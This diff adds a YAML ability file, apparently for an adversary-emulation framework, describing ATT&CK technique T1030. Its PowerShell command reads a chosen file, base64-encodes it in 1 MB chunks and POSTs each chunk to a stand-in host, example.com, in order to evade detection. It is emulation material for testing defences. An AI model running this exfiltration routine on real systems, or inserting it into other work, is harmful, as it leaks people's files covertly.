@@ -1,0 +1,22 @@
+---
+- id: 43b3acfd653adf10dac48988319bf512
+  name: Network-Based Data Transfer in Small Chunks
+  description: Simulate transferring data over a network in small chunks to evade
+    detection.
+  tactic: exfiltration
+  technique:
+    attack_id: T1030
+    name: Data Transfer Size Limits
+  platforms:
+    windows:
+      psh:
+        command: $file = [System.IO.File]::OpenRead([User specified]); $chunkSize
+          = 1024 * 1KB; $buffer = New-Object Byte[] $chunkSize; while ($bytesRead
+          = $file.Read($buffer, 0, $buffer.Length)) {;     $encodedChunk = [Convert]::ToBase64String($buffer,
+          0, $bytesRead);     Invoke-WebRequest -Uri http://example.com -Method Post
+          -Body $encodedChunk; }; $file.Close()
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
